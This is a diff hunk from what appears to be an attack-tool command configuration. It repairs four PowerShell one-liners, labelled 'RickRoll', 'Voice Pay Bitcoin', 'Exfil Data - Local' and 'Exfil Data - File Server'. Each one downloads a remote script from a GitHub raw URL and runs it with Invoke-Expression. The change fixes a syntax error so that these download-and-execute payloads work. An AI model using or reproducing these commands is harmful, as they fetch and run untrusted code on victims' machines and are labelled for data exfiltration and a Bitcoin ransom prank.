@@ -25,15 +25,15 @@ powershell Get-PSDrive
 
 
 #RickRoll
-set Command 'powershell -c ""& { $script = Invoke-WebRequest https://raw.githubusercontent.com/CYBER4CE/ST/master/r.txt; Invoke-Expression $($script).content); $script -eq $null; }""'
+set Command 'powershell -c ""& { $script = Invoke-WebRequest https://raw.githubusercontent.com/CYBER4CE/ST/master/r.txt; Invoke-Expression $($script.content); $script -eq $null; }""'
 
 #Voice Pay Bitcoin
-set Command 'powershell -c ""& { $script = Invoke-WebRequest https://raw.githubusercontent.com/CYBER4CE/ST/master/v.txt; Invoke-Expression $($script).content); $script -eq $null; }""'
+set Command 'powershell -c ""& { $script = Invoke-WebRequest https://raw.githubusercontent.com/CYBER4CE/ST/master/v.txt; Invoke-Expression $($script.content); $script -eq $null; }""'
 
 #Exfil Data - Local
-set Command 'powershell -c ""& { $script = Invoke-WebRequest https://raw.githubusercontent.com/CYBER4CE/ST/master/e.txt; Invoke-Expression $($script).content); $script -eq $null; }""'
+set Command 'powershell -c ""& { $script = Invoke-WebRequest https://raw.githubusercontent.com/CYBER4CE/ST/master/e.txt; Invoke-Expression $($script.content); $script -eq $null; }""'
 
 #Exfil Data - File Server
-set Command 'powershell -c ""& { $script = Invoke-WebRequest https://raw.githubusercontent.com/CYBER4CE/ST/master/f.txt; Invoke-Expression $($script).content); $script -eq $null; }""'
+set Command 'powershell -c ""& { $script = Invoke-WebRequest https://raw.githubusercontent.com/CYBER4CE/ST/master/f.txt; Invoke-Expression $($script.content); $script -eq $null; }""'
 
 
